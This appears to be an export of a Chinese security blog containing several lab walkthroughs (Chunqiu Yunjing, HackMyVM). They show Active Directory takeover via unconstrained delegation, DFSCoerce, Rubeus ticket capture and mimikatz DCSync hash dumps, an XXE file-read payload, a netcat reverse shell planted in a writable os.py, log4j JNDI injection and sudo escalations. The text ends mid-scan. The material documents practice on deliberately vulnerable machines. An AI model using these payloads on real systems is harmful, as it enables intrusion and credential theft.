__\n     /\\   |  __ \\(_)      / _|\n    /  \\  | |  | |_ _ __ | |_ ___\n   / /\\ \\ | |  | | | '_ \\|  _/ _ \\     Tools that collect information from domain\n  / ____ \\| |__| | | | | | || (_) |\n /_/    \\_\\_____/|_|_| |_|_| \\___/     v1.5 by lzz\n\n[i] Try to connect '172.22.4.7'\n[c] Auth Domain: xiaorang.lab\n[c] Auth user: WIN19$\n[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9\n[c] connected successfully,try to dump domain info\n[i] DomainVersion found!\n                    [+] Windows 2016 Server operating system\n[i] Domain SID:\n                    [+] S-1-5-21-1913786442-1328635469-1954894845\n[i] Domain MAQ found\n                    [+] 10\n[i] Domain Account Policy found\n                    [+] pwdHistory: 24\n                    [+] minPwdLength: 7\n                    [+] minPwdAge: 1(day)\n                    [+] maxPwdAge: 42(day)\n                    [+] lockoutThreshold: 0\n                    [+] lockoutDuration: 30(min)\n[i] Domain Controllers: 1 found\n                    [+] DC01$  ==>>>   Windows Server 2016 Datacenter  [10.0 (14393)]  ==>>>  172.22.4.7\n[i] ADCS has not found!\n[i] Domain Exchange Server: 0 found\n[i] Domain All DNS:\n                    [+] Domain Dns 3 found,Saved in All_DNS.csv\n[i] Domain Trusts: 0 found\n[i] SPN: 39 found\n[i] Domain GPOs: 2 found\n[i] Domain Admins: 1 users found\n                    [+]Administrator\n[i] Enterprise Admins: 1 users found\n                    [+]Administrator\n[i] administrators: 1 users found\n                    [+]Administrator\n[i] Backup Operators: 0 users found\n[i] Users: 6 found\n[i] User with Mail: 0 found\n[i] Only_name_and_Useful_Users: 3 found\n[i] Only_admincount=1_andUseful_Users: 1 found\n[i] Locked Users: 0 found\n[i] Disabled Users: 3 found\n[i] Users with passwords not set to expire: 2 found\n[i] Domain Computers: 5 found\n[i] Only_name_and_Useful_computers: 5 found\n[i] Groups: 49 found\n[i] Domain OUs: 1 found\n[i] LAPS Not found\n[i] LAPS passwords: 0 found\n[i] SensitiveDelegate Users: 0 found\n[i] AsReproast Users: 0 found\n[i] Kerberoast Users: 1 found\n                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==>>>  kadmin/changepw\n[i] SIDHistory Users: 0 found\n[i] CreatorSID Users: 2 found\n                    [+] WIN-3X7U15C2XDM$  ==>>>  Marcus\n                    [+] WIN-YUUAW2QG9MF$  ==>>>  Marcus\n[i] RBCD Users: 0 found\n[i] Unconstrained Deligation Users: 1 found\n                    [+] WIN19$\n[i] Constrained Deligation Users: 0 found\n[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST\n[i] CSVs written to 'csv' directory in C:\\Users\\lv\\Desktop\n[i] Execution took 1.0246743s\n~~~\n\n~~~\n[i] Unconstrained Deligation Users: 1 found\n                    [+] WIN19$\n~~~\n\nWIN19$有非约束委派，上传Rubeus进行监听\n\n~~~\nRubeus.exe monitor /interval:1 /filteruser:DC01$\n~~~\n\n~~~\nC:\\Users\\lv\\Desktop>Rubeus.exe monitor /interval:1 /filteruser:DC01$\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: TGT Monitoring\n[*] Target user     : DC01$\n[*] Monitoring every 1 seconds for new TGTs\n\n\n~~~\n\n然后使用dfscoerce让DS向WIN19$认证\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u \"WIN19$\" -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7\n[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs]\n[+] Successfully bound!\n[-] Sending NetrDfsRemoveStdRoot!\nNetrDfsRemoveStdRoot\nServerName:                      'WIN19\\x00'\nRootShare:                       'test\\x00'\nApiFlags:                        1\n\n\nDFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.\n~~~\n\n~~~\nC:\\Users\\lvv\\Desktop>Rubeus.exe monitor /interval:1 /filteruser:DC01$\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: TGT Monitoring\n[*] Target user     : DC01$\n[*] Monitoring every 1 seconds for new TGTs\n\n\n[*] 2025/4/18 4:54:32 UTC - Found new TGT:\n\n  User                  :  DC01$@XIAORANG.LAB\n  StartTime             :  2025/4/18 10:28:04\n  EndTime               :  2025/4/18 20:28:04\n  RenewTill             :  2025/4/25 10:28:04\n  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\n  Base64EncodedTicket   :\n\n    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\n    QU5HLkxBQg==\n\n[*] Ticket cache size: 1\n\n~~~\n\n导入 TGT 然后 DCSync\n\n~~~\nRubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==\n~~~\n\n~~~\nmimikatz.exe \"lsadump::dcsync /all /csv\"\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  767e06b9c74fd628dd13785006a9092b        514\n1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512\n1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512\n1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096\n1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096\n1000    DC01$   23414273a692373e6e076d5fdbb2c213        532480\n500     Administrator   4889f6553239ace1f7c47fa2c619c252        512\n1103    FILESERVER$     dd213f63df5b16b2daa567705ca88ac7        4096\n1104    WIN19$  b6547b5e9c27c42b5cb096f1c922bc3a        528384\n\n~~~\n\n可以拿到域控的哈希\n\n然后登录即可\n\n~~~\nC:\\Users\\Administrator\\flag> type flag04.txt\n~~~\n\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"HackmyVM-system","url":"/2025/04/17/Hackmyvm-system/","content":"\n\n\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:72:be:a6       PCS Systemtechnik GmbH\n192.168.31.141  08:00:27:27:28:54       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.141就是靶机ip\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.141\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDT\nNmap scan report for 192.168.31.141\nHost is up (0.0029s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n~~~\n\n# 80端口\n\n有一个登录的页面，通过查看请求头可以发现他是以xml的格式传输的\n\n~~~\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><details><email>123@123.com</email><password>123</password></details>\n~~~\n\n试一试xxe注入\n\n~~~\n<!DOCTYPE test [ \n<!ENTITY test1 SYSTEM \"file:///etc/passwd\"> \n]><details><email>$test1;</email><password>123</password></details>\n~~~\n\n~~~\n<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndavid:x:1000:1000::/home/david:/bin/bash\n is already registered! </font> </p>\n~~~\n\n读取david用户的私钥尝试登录，但是会登录失败，通过fuzz可以知道/home/david还有一个.viminfo\n\n~~~\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php  -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///home/david/FUZZ\"> ]> <details><email>&xxe;</email><password>das</password></details>' --fw 11\n~~~\n\n~~~\n # This viminfo file was generated by Vim 8.2.\n# You may edit it if you're careful!\n\n# Viminfo version\n|1,4\n\n# Value of 'encoding' when this file was written\n*encoding=utf-8\n\n\n# hlsearch on (H) or off (h):\n~h\n# Command Line History (newest to oldest):\n:wq!\n|2,0,1648909714,,\"wq!\"\n\n# Search String History (newest to oldest):\n\n# Expression History (newest to oldest):\n\n# Input Line History (newest to oldest):\n\n# Debug Line History (newest to oldest):\n\n# Registers:\n\n# Password file Created:\n'0  1  3  /usr/local/etc/mypass.txt\n|4,48,1,3,1648909714,\"/usr/local/etc/mypass.txt\"\n\n# History of marks within files (newest to oldest):\n\n> /usr/local/etc/mypass.txt\n\t*\t1648909713\t0\n\t\"\t1\t3\n\t^\t1\t4\n\t.\t1\t3\n\t+\t1\t3\n~~~\n\n然后读取/usr/local/etc/mypass.txt文件\n\ndavid的密码为`h4ck3rd4v!d `\n\n# 提权\n\n上传一个pspy64查看，发现每隔一段时间会运行一次suid.py文件\n\n~~~\n2025/04/18 04:01:01 CMD: UID=0     PID=670    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py\n~~~\n\n~~~\n#suid.py\nfrom os import system\nfrom pathlib import Path\n\n# Reading only first line\ntry:\n    with open('/home/david/cmd.txt', 'r') as f:\n        read_only_first_line = f.readline()\n    # Write a new file\n    with open('/tmp/suid.txt', 'w') as f:\n        f.write(f\"{read_only_first_line}\")\n    check = Path('/tmp/suid.txt')\n    if check:\n        print(\"File exists\")\n        try:\n            os.system(\"chmod u+s /bin/bash\")\n        except NameError:\n            print(\"Done\")\n    else:\n        print(\"File not exists\")\nexcept FileNotFoundError:\n    print(\"File not exists\")\n~~~\n\n这个脚本永远不会执行chmod，查看是否可以劫持\n\n~~~\npython3 -c 'import sys; print(sys.path)'\n['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages']\ndavid@system:/usr/lib/python3.9$ find ./ -writable 2>/dev/null\n./os.py\n~~~\n\n向os.py尾部添加\n\n~~~\nimport subprocess\ndef shell():\n    import subprocess\n    subprocess.call(\"nc\" + \"192.168.31.129 9999 -e /bin/bash\", shell=True)\nshell()\n~~~\n\n然后监听一个端口静静等shell弹回来\n\n~~~\nid\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Blackhat","url":"/2025/04/17/Hackmyvm-Blackhat/","content":"\n\n\n\n\n# 信息搜集\n\narp-scan -l扫描\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:73:b2:7a       PCS Systemtechnik GmbH\n192.168.31.140  08:00:27:19:a9:32       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.140是靶机地址\n\n然后扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.140\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDT\nNmap scan report for 192.168.31.140\nHost is up (0.0019s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.85 seconds\n~~~\n\n只开了一个80端口，扫描一下目录可以扫描到一个phpinfo.php\n\n~~~\nLoaded Modules\tcore mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status\n~~~\n\nmod_backdoor 存在漏洞\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl 192.168.31.140 -H \"Backdoor: id\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\n反弹一个shell出来，上传 linpeas.sh ，运行看结果\n\n~~~\n╔══════════╣ Files with ACLs (limited to 50)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls\n# file: /etc/sudoers\nUSER   root       r--\nuser   darkdante  rw-\nGROUP  root       r--\nmask              rw-\nother             ---\n~~~\n\n可以看到sudoers文件darkdante有写的权限，darkdante直接su就登录了哈哈哈哈哈\n\n写入sudoers文件\n\n~~~\ndarkdante ALL=(ALL:ALL) ALL\n~~~\n\n然后sudo su，提权成功\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"春秋云镜-Certify","url":"/2025/04/16/春秋云镜-Certify/","content":"\n\n\n# FLAG1\n\n先用fscan扫一扫\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.99.135.211\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-16 11:59:40] [INFO] 暴力破解线程数: 1\n[2025-04-16 11:59:40] [INFO] 开始信息扫描\n[2025-04-16 11:59:40] [INFO] 最终有效主机数量: 1\n[2025-04-16 11:59:41] [INFO] 开始主机扫描\n[2025-04-16 11:59:41] [INFO] 有效端口数量: 233\n[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:22\n[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:80\n[2025-04-16 11:59:41] [SUCCESS] 服务识别 39.99.135.211:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-16 11:59:45] [SUCCESS] 端口开放 39.99.135.211:8983\n[2025-04-16 11:59:46] [SUCCESS] 服务识别 39.99.135.211:80 => [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu\n[2025-04-16 11:59:55] [SUCCESS] 服务识别 39.99.135.211:8983 => [http] 产品:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.]\n[2025-04-16 11:59:55] [INFO] 存活端口数量: 3\n[2025-04-16 11:59:55] [INFO] 开始漏洞扫描\n[2025-04-16 11:59:55] [INFO] 加载的插件: ssh, webpoc, webtitle\n[2025-04-16 11:59:55] [SUCCESS] 网站标题 http://39.99.135.211      状态码:200 长度:612    标题:Welcome to nginx!\n[2025-04-16 11:59:56] [SUCCESS] 网站标题 http://39.99.135.211:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.135.211:8983/solr/\n[2025-04-16 11:59:57] [SUCCESS] 网站标题 http://39.99.135.211:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin\n[2025-04-16 12:00:04] [SUCCESS] 扫描已完成: 5/5\n~~~\n\n39.99.135.211:8983是一个solr面板，存在log4j漏洞\n\n~~~\nhttp://39.99.135.211:8983/solr/admin/cores?action=${jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com}\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify1.png)\n\n上vps，可以利用[java-chains](https://github.com/vulhub/java-chains)反弹一个shell,反弹的shell如果不舒服可以写一个公钥进去\n\n~~~\nsolr@ubuntu:/opt/solr$ sudo -l\nsudo -l\nMatching Defaults entries for solr on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser solr may run the following commands on ubuntu:\n    (root) NOPASSWD: /usr/bin/gr\n~~~\n\n提权`sudo grc --pty /bin/sh`\n\n~~~\nsolr@ubuntu:~$ sudo grc --pty /bin/sh\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n提权到root后，写一个公钥进去，flag01在/root/flag下，然后上传一个fscan，再做一个代理\n\n# FLAG2\n\n查看一下内网的ip端，开扫！\n\n~~~\nroot@ubuntu:/tmp# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315357456sec preferred_lft 315357456sec\n    inet6 fe80::216:3eff:fe26:2bc3/64 scope link\n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\nroot@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-17 00:40:03] [INFO] 暴力破解线程数: 1\n[2025-04-17 00:40:03] [INFO] 开始信息扫描\n[2025-04-17 00:40:03] [INFO] CIDR范围: 172.22.9.0-172.22.9.255\n[2025-04-17 00:40:03] [INFO] 生成IP范围: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-17 00:40:03] [INFO] 解析CIDR 172.22.9.19/24 -> IP范围 172.22.9.0-172.22.9.255\n[2025-04-17 00:40:03] [INFO] 最终有效主机数量: 256\n[2025-04-17 00:40:03] [INFO] 开始主机扫描\n[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.19     存活 (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.7      存活 (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.26     存活 (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.47     存活 (ICMP)\n[2025-04-17 00:40:06] [INFO] 存活主机数量: 4\n[2025-04-17 00:40:06] [INFO] 有效端口数量: 233\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:88\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:80\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:80\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:22\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:80\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:21\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:22\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:445\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:445\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:445\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:389\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:139\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:139\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:139\n[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:135\n[2025-04-17 00:40:06] 